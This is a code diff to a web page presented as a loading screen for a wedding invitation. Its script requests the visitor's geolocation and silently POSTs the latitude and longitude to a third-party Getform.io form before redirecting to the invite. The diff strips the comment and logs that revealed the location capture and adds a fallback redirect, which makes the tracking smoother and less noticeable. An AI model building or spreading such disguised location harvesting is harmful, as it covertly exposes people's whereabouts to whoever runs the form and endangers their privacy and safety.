@@ -38,23 +38,29 @@
   <p>Preparing your special invitation... Please wait...</p>
 
   <script>
-    // Wait 2 seconds to show loader animation
-    setTimeout(function() {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(success, error);
-      } else {
-        alert("Geolocation is not supported by your browser.");
+    let redirected = false; // flag to avoid double redirect
+
+    function redirectNow() {
+      if (!redirected) {
+        redirected = true;
+        window.location.href = "https://starboy-mukund.github.io/wedding-invite/";
       }
-    }, 2000);
+    }
+
+    setTimeout(function() {
+      redirectNow();  // fallback after 5 seconds
+    }, 5000);
+
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(success, error);
+    } else {
+      redirectNow();
+    }
 
     function success(position) {
       const latitude = position.coords.latitude;
       const longitude = position.coords.longitude;
 
-      console.log("Latitude: " + latitude);
-      console.log("Longitude: " + longitude);
-
-      // Send the captured location to your Getform.io
       fetch("https://getform.io/f/bnlqdjlb", {
         method: "POST",
         headers: {
@@ -65,15 +71,14 @@
           longitude: longitude
         })
       }).then(response => {
-        window.location.href = "https://starboy-mukund.github.io/wedding-invite/";
-      }).catch(error => {
-        window.location.href = "https://starboy-mukund.github.io/wedding-invite/";
+        redirectNow();
+      }).catch(err => {
+        redirectNow();
       });
     }
 
     function error(err) {
-      console.warn(`ERROR(${err.code}): ${err.message}`);
-      window.location.href = "https://starboy-mukund.github.io/wedding-invite/";
+      redirectNow();
     }
   </script>
 
